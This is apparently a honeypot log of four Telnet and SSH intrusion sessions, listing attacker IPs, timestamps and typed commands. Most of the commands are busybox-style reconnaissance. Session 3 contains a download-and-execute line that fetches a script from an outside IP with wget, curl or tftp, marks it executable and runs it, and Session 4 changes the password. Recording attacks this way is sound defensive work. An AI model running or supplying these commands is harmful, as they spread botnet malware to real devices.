# Interesting Sessions

## Session 1: `9a50cd5862c8`
- **source IP**: 113.26.87.239
- **source Port**: 41470
- **protocol**: Telnet
- **port**: 2223
- **timestamp**: 2024-03-06 22:35
- **duration**: 2 sec

cnf (command not found)
### Commands Executed:
```cmd
enable
system(cnf) 
shell(cnf)
sh
cat /proc/mounts; /bin/busybox LSMRW
tftp; wget; /bin/busybox LSMRW
cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox LSMRW
dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s<<while read i
/bin/busybox LSMRW<<rm .s; exit
```

## Session 2: `87a6c8f2c579`
- **src_ip**: 123.173.70.38
- **src_port**: 54037
- **telnet**: 2223
- **time**: 2024-03-07 05:57:37
- **duration**: 3 sec
  
### Commands Executed:
```cmd
enable
system(cnf)
shell(cnf)
sh
cat /proc/mounts; /bin/busybox VSHRM
cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox VSHRM
tftp; wget; /bin/busybox VSHRM
dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
/bin/busybox VSHRM
rm .s; exit
```

## Session 3: `103b371dd226` 
- **src_ip**: 185.191.126.213
- **src_port**: 59572
- **ssh**: 2222
- **time**: 2024-03-11 15:13:50
- **duration**: 47 sec

### Commands Executed:
```cmd
enable
system(cnf)
shell(cnf)
sh
linuxshell(cnf)
cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
rm -rf sh; wget http://185.191.124.171/scripts/sh || curl -O http://185.191.124.171/scripts/sh || tftp 185.191.124.171 -c get sh || tftp -g -r sh 185.191.124.171; chmod 777 sh;./sh ssh; rm -rf sh
```

## Session 4: `c0f3406878dc`
- **src_ip**: 91.245.156.104
- **src_port**: 1506
- **telnet**: 2223
- **time**: 2024-03-04 03:51:20
- **duration**: 10 sec

### Commands Executed:
```cmd
start(cnf)
config terminal(cnf)
enable
system(cnf)
linuxshell(cnf)
shell(cnf)
sh
echo -e '\x69\x6D\x66\x75\x6F'
#cowrie.command.success message INPUT (passwd): adminpass
passwd
#cowrie.command.success message INPUT (passwd): adminpass
cat /bin/ls|more (cnf)
cd /tmp || cd /var || cd /dev || cd /etc
cat /bin/ls|head -n 1
```
